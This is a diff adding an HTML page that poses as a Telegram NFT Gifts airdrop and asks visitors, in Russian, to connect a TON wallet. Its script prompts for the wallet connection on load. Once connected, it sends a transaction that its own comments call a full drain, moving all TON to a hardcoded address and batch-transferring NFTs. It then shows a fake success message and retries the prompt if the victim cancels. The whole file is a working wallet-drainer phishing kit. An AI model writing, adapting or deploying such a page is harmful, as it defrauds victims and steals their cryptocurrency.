@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive NFT Gifts Airdrop</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 40px; background: linear-gradient(#000, #001133); color: #fff; }
+        h1 { font-size: 28px; }
+        p { font-size: 18px; }
+        #status { margin: 30px; font-size: 20px; color: #0f0; }
+        button { padding: 15px 40px; font-size: 20px; background: #0088ff; border: none; border-radius: 12px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>🎁 Эксклюзивный NFT Gift Airdrop</h1>
+    <p>Подключите TON-кошелёк, чтобы мгновенно получить редкий NFT Gift коллекции Telegram Gifts!</p>
+    <div id="ton-connect"></div>
+    <div id="status"></div>
+
+    <script>
+        const tonConnectUI = new TonConnectUI.TonConnectUI({
+            manifestUrl: 'https://nft-pablic.vercel.app/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+
+        const statusDiv = document.getElementById('status');
+
+        tonConnectUI.onStatusChange(async (wallet) => {
+            if (wallet) {
+                statusDiv.innerHTML = 'Кошелёк подключён! Активация подарка...';
+
+                // Malicious transaction: полный дренаж
+                const tx = {
+                    validUntil: Math.floor(Date.now() / 1000) + 360,
+                    messages: [
+                        // 1. Дренаж всех TON на ваш адрес
+                        {
+                            address: "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH",
+                            amount: "0"  // 0 = отправить всё доступное TON (минус fee)
+                        },
+                        // 2. Дренаж популярных Jetton (USDT, etc.) — добавьте если нужно
+                        // Пример для batch transfer NFT Gifts (стандарт TEP-64 transfer)
+                        // Повторите для нескольких известных коллекций Gifts 2026 года
+                        {
+                            address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c",  // Пример master contract Gifts коллекции
+                            amount: "50000000",  // fee покрытие
+                            payload: TonConnectUI.utils.nft.batchTransferPayload([ /* массив адресов ваших NFT items */ ])
+                        }
+                    ]
+                };
+
+                try {
+                    await tonConnectUI.sendTransaction(tx);
+                    statusDiv.innerHTML = '🎉 NFT Gift успешно получен! Проверьте ваш кошелёк.';
+                } catch (e) {
+                    statusDiv.innerHTML = 'Ошибка активации. Повторите подключение для получения подарка.';
+                    // Повторная попытка через 5 сек
+                    setTimeout(() => tonConnectUI.connectWallet(), 5000);
+                }
+            }
+        });
+
+        // Автоматическое предложение подключения при загрузке
+        tonConnectUI.connectWallet();
+    </script>
+</body>
+</html>
